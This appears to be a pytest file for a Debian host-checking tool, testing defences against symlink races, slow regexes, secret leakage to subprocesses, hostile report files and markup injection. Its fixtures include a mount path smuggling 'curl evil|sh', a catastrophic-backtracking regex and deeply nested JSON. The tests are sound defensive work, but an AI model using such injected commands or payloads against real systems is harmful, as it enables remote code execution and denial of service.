"""Limits on what files, configs and other programs can do during a run."""

from __future__ import annotations

import json
import os
import signal
import subprocess
import time
from dataclasses import replace
from pathlib import Path
from typing import Any

import pytest

from conftest import make_sample_report
from pydebuprep import patterns, system
from pydebuprep.checks import _diskutil
from pydebuprep.checks.debsums import MAX_TIMEOUT, DebsumsCheck
from pydebuprep.checks.dmesg_errors import DMESG_ERR, DMESG_WARN, DmesgErrorsCheck
from pydebuprep.checks.fstab import FINDMNT_LIST, FstabCheck
from pydebuprep.checks.journal_errors import JOURNAL, JournalErrorsCheck
from pydebuprep.model import Status
from pydebuprep.patterns import PatternTimeout, match_budget
from pydebuprep.render import render
from pydebuprep.render._common import clean
from pydebuprep.reportfile import ReportFileError, load_report
from pydebuprep.runner import run_check
from pydebuprep.snapshot import SnapshotError, load_snapshot
from pydebuprep.state import _cache_name, load_cached_config
from pydebuprep.system import AS_POSTGRES, PG_SOCKET_DIR, PSQL_FLAGS, System

from .helpers import make_ctx

DEEP_JSON = "[" * 200_000
# No repeat inside a repeat, so it passes the shape rules, yet on a long line it takes for ever.
EVIL_PATTERN = ".*.*.*.*.*.*.*.*x"
LONG_LINE = "a" * 400


# --- Reading a file as root, while its owner moves things around ------------------------


def test_a_parent_directory_swapped_for_a_symlink_is_not_followed(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The type check sees a regular file; then the directory becomes a symlink to /dev, say."""
    home = tmp_path / "home"
    home.mkdir()
    (home / "watchdog").write_text("harmless")
    device_dir = tmp_path / "dev"
    device_dir.mkdir()
    (device_dir / "watchdog").write_text("opened through the symlink")
    real_lstat = os.lstat
    real_realpath = os.path.realpath
    resolved: list[str] = []

    def realpath(path: str) -> str:
        resolved.append(real_realpath(path))  # realpath itself calls lstat: not yet
        return resolved[-1]

    def lstat_then_swap(path: Any) -> os.stat_result:
        result = real_lstat(path)
        if resolved == [str(path)]:
            resolved.append("swapped")
            home.rename(tmp_path / "moved")
            home.symlink_to(device_dir)
        return result

    monkeypatch.setattr(system.os.path, "realpath", realpath)
    monkeypatch.setattr(system.os, "lstat", lstat_then_swap)
    assert System().read_bytes(str(home / "watchdog")) is None
    assert "swapped" in resolved


def test_a_real_directory_on_the_way_is_fine(tmp_path: Path) -> None:
    (tmp_path / "a" / "b").mkdir(parents=True)
    (tmp_path / "a" / "b" / "file").write_text("text")
    assert System().read_text(str(tmp_path / "a" / "b" / "file")) == "text"


def test_a_symlink_to_a_file_is_still_followed(tmp_path: Path) -> None:
    (tmp_path / "file").write_text("text")
    (tmp_path / "link").symlink_to(tmp_path / "file")
    assert System().read_text(str(tmp_path / "link")) == "text"


@pytest.mark.parametrize("target", ["/proc/version", "/sys/kernel/mm/transparent_hugepage/enabled"])
def test_a_symlink_into_a_pseudo_filesystem_is_refused(tmp_path: Path, target: str) -> None:
    """Their files look regular, but reading can have effects: /proc/kmsg consumes the log."""
    link = tmp_path / "link"
    link.symlink_to(target)
    assert System().read_bytes(str(link)) is None


def test_a_pseudo_filesystem_can_be_read_by_its_own_name() -> None:
    assert System().read_text("/proc/version")


# --- Config patterns: limits on what they can cost ---------------------------------------


def test_a_slow_pattern_passes_the_shape_rules() -> None:
    """Why a time budget is needed: no shape rule catches every slow pattern."""
    assert patterns.pattern_problem(EVIL_PATTERN) is None


def test_the_budget_stops_a_pattern_that_would_take_for_ever() -> None:
    import re

    started = time.monotonic()
    with pytest.raises(PatternTimeout), match_budget(0.2):
        re.search(EVIL_PATTERN, LONG_LINE)
    assert time.monotonic() - started < 10


def test_the_budget_puts_things_back() -> None:
    before = signal.getsignal(signal.SIGALRM)
    with match_budget(30):
        assert signal.getitimer(signal.ITIMER_REAL)[0] > 0
    assert signal.getsignal(signal.SIGALRM) == before
    assert signal.getitimer(signal.ITIMER_REAL)[0] == 0


def _journal_line(message: str) -> str:
    return json.dumps({"SYSLOG_IDENTIFIER": "x", "MESSAGE": message})


def test_a_slow_journal_pattern_fails_that_check_only(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(patterns, "MATCH_SECONDS", 0.2)
    ctx = make_ctx(commands={JOURNAL: _journal_line(LONG_LINE)})
    result = run_check(JournalErrorsCheck({"ignore": [EVIL_PATTERN]}), ctx)
    assert result.status == Status.ERROR
    assert "took too long" in (result.error or "")


def test_a_slow_shared_pattern_fails_that_check_only(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(patterns, "MATCH_SECONDS", 0.2)
    ctx = replace(
        make_ctx(commands={JOURNAL: _journal_line(LONG_LINE)}), log_ignore=(EVIL_PATTERN,)
    )
    assert run_check(JournalErrorsCheck(), ctx).status == Status.ERROR


def test_a_slow_kernel_pattern_fails_that_check_only(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(patterns, "MATCH_SECONDS", 0.2)
    ctx = make_ctx(commands={DMESG_ERR: LONG_LINE, DMESG_WARN: ""}, root=True)
    result = run_check(DmesgErrorsCheck({"ignore": [EVIL_PATTERN]}), ctx)
    assert result.status == Status.ERROR
    assert "took too long" in (result.error or "")


# --- What other programs get to see -------------------------------------------------------


def _env_of(monkeypatch: pytest.MonkeyPatch, argv: tuple[str, ...]) -> dict[str, str]:
    seen: dict[str, str] = {}

    def fake_run(_args: Any, **kwargs: Any) -> subprocess.CompletedProcess[bytes]:
        seen.update(kwargs["env"])
        return subprocess.CompletedProcess(argv, 0, b"", b"")

    monkeypatch.setattr(system.subprocess, "run", fake_run)
    System().run(argv)
    return seen


def test_the_upload_token_is_not_passed_to_commands(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("PYDEBUPREP_TOKEN", "pdp_secret")
    assert "PYDEBUPREP_TOKEN" not in _env_of(monkeypatch, ("uname", "-r"))


def test_a_command_running_as_postgres_gets_a_minimal_environment(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """Any process of that user can read the environment of the psql it starts."""
    monkeypatch.setenv("AWS_SECRET_ACCESS_KEY", "secret")
    monkeypatch.setenv("PATH", "/usr/bin:/bin")
    argv = (*AS_POSTGRES, *PSQL_FLAGS, "-h", PG_SOCKET_DIR, "-p", "5432", "-d", "postgres",
            "-c", "SELECT 1")  # fmt: skip
    assert _env_of(monkeypatch, argv) == {"PATH": "/usr/bin:/bin", "LC_ALL": "C", "LANG": "C"}


# --- Commands a report suggests running as root --------------------------------------------


EVIL_MOUNT = "/home/u/x;curl evil|sh"


def test_a_mount_point_in_a_fix_is_quoted() -> None:
    ctx = make_ctx(commands={FINDMNT_LIST: ""})
    (finding,) = FstabCheck().compare(ctx, [EVIL_MOUNT])
    assert f"sudo mount '{EVIL_MOUNT}'" in finding.remediation
    assert f"Check its fstab entry and mount unit: findmnt --fstab '{EVIL_MOUNT}'" in (
        finding.remediation
    )


def test_a_plain_mount_point_in_a_fix_stays_plain() -> None:
    ctx = make_ctx(commands={FINDMNT_LIST: ""})
    (finding,) = FstabCheck().compare(ctx, ["/srv/backup"])
    assert "sudo mount /srv/backup" in finding.remediation


def test_a_mount_point_in_the_inode_fix_is_quoted() -> None:
    usage = system.DiskUsage(total=0, free=0, inodes_total=100, inodes_free=1)
    (finding,) = _diskutil.space_findings(EVIL_MOUNT, usage, [])
    assert f"sudo du --inodes -x '{EVIL_MOUNT}' " in finding.remediation[0]


# --- Files from elsewhere ------------------------------------------------------------------


@pytest.mark.parametrize(
    "text",
    [DEEP_JSON, "a: " + "[" * 200_000, '{"schema_version": ' + "1" * 5000 + "}"],
    ids=["deep json", "deep yaml", "huge integer"],
)
def test_a_hostile_report_file_is_refused_cleanly(text: str) -> None:
    with pytest.raises(ReportFileError):
        load_report(text)


def test_a_deep_snapshot_is_refused_cleanly(tmp_path: Path) -> None:
    path = tmp_path / "snapshot.json"
    path.write_text(DEEP_JSON)
    with pytest.raises(SnapshotError):
        load_snapshot(str(path))


def test_a_deep_saved_config_is_ignored(tmp_path: Path) -> None:
    url = "https://portal.example/config"
    (tmp_path / _cache_name(url)).write_text(DEEP_JSON)
    assert load_cached_config(str(tmp_path), url) is None


# --- Options ------------------------------------------------------------------------------


def test_the_debsums_timeout_has_an_upper_limit() -> None:
    assert DebsumsCheck({"timeout_seconds": MAX_TIMEOUT}).opt("timeout_seconds") == MAX_TIMEOUT
    with pytest.raises(ValueError, match="timeout_seconds"):
        DebsumsCheck({"timeout_seconds": MAX_TIMEOUT + 1})


# --- Text from hosts in what people read ---------------------------------------------------


@pytest.mark.parametrize("code", [0x202E, 0x202A, 0x2066, 0x2069, 0x200F, 0x061C])
def test_text_direction_controls_are_cleaned(code: int) -> None:
    """They can make a command read differently from what it does."""
    assert clean(f"sudo rm {chr(code)}x") == "sudo rm ?x"


def test_a_check_id_can_not_add_jira_markup() -> None:
    report = make_sample_report()
    evil = "x}} [click|http://evil.example] {{y"
    report = replace(report, results=[replace(report.results[0], id=evil)])
    out = render(report, "jira-legacy")
    assert "[click|http" not in out
